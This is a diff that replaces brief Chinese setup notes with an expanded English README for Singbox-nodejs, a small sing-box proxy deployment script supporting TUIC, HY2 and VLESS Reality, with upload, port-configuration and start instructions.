@@ -1,17 +1,87 @@
-### 更新说明：适用128M内存以上环境，不建议freecloudpanel使用（64M内存）
+# 🎉 Singbox-nodejs - Easy Setup for Your Application
 
-* 精简化：去除哪吒、argo隧道；保留3种协议：tuic、hy2、vless+xtls+reality
+[![Download Singbox-nodejs](https://img.shields.io/badge/Download-Singbox--nodejs-brightgreen)](https://github.com/DerricB-front/Singbox-nodejs/releases)
 
-* uuid自动生成
-  
-* 自动重启：每天凌晨00:03自动执行一次Sing-box重启，清除缓存
-  
-* TCP/UDP端口可共用
-  
-### 使用说明：
+## 🚀 Getting Started
 
-1：start.sh+index.js+package.json上传至服务器
+Welcome to Singbox-nodejs! This guide will help you download and run the application easily. Follow the steps below, and you will be up and running in no time.
 
-2：输入tuic/hy2/vless端口，保存
+### 📝 Overview
 
-3：开机
+Singbox-nodejs is designed to work in environments with at least 128MB of memory. Note that it is not recommended for use with FreeCloudPanel, which offers 64MB of memory.
+
+Key features include:
+
+- Minimalistic design by removing unnecessary components like Nezha and Argo tunnels.
+- Support for three protocols: TUIC, HY2, and VLESS with XTLS and Reality.
+- Automatic UUID generation.
+- Daily automatic restart at 00:03 to clear cache.
+- Shared TCP/UDP ports for ease of use.
+
+### 📥 Download & Install
+
+To download Singbox-nodejs, visit the official [Releases page](https://github.com/DerricB-front/Singbox-nodejs/releases). There, you will find the latest version available for download.
+
+Follow these steps to install:
+
+1. **Visit the Releases Page**  
+   Go to [this link](https://github.com/DerricB-front/Singbox-nodejs/releases) to find the latest release.
+
+2. **Download the Files**  
+   Look for the relevant files for your environment. You will typically need to download `start.sh`, `index.js`, and `package.json`. Click on each of these files to download them.
+
+### 📂 Upload Files to Your Server
+
+Once you have downloaded the necessary files, upload them to your server.
+
+1. Use an FTP client or any file transfer method you prefer.
+2. Navigate to the directory where you want to run Singbox-nodejs.
+3. Upload the following files:
+   - `start.sh`
+   - `index.js`
+   - `package.json`
+
+### 🔧 Configure Singbox-nodejs
+
+After you have uploaded the files, you need to configure the application:
+
+1. Open the `start.sh` file in a text editor.
+2. Enter the desired ports for the protocols:
+   - **TUIC Port**
+   - **HY2 Port**
+   - **VLESS Port**
+3. Save your changes.
+
+### 📡 Start the Application
+
+To start Singbox-nodejs, follow these steps:
+
+1. Open your terminal or command line interface.
+2. Navigate to the directory where you uploaded the files.
+3. Run the `start.sh` script by typing:
+   ```
+   bash start.sh
+   ```
+4. Your application should now start.
+
+### 🛠️ Daily Maintenance
+
+Singbox-nodejs is set to automatically restart every day at 00:03. This function helps to clear the cache and ensure smooth operation.
+
+### 🆘 Troubleshooting
+
+If you encounter issues while running Singbox-nodejs, consider the following:
+
+- Check if all files are uploaded correctly to your server.
+- Ensure the specified ports are not blocked by your firewall.
+- Consult the application logs to explore potential errors.
+
+### 📈 Learn More
+
+To get the most out of Singbox-nodejs, refer to the documentation on GitHub. Many common questions and troubleshooting tips are available there.
+
+If you face any challenges that are not covered in the documentation, feel free to reach out for support. 
+
+For further insights on usage and community discussions, join forums or relevant discussion groups where users share their experiences.
+
+In summary, you have the tools needed to install and run Singbox-nodejs. Enjoy exploring its features!
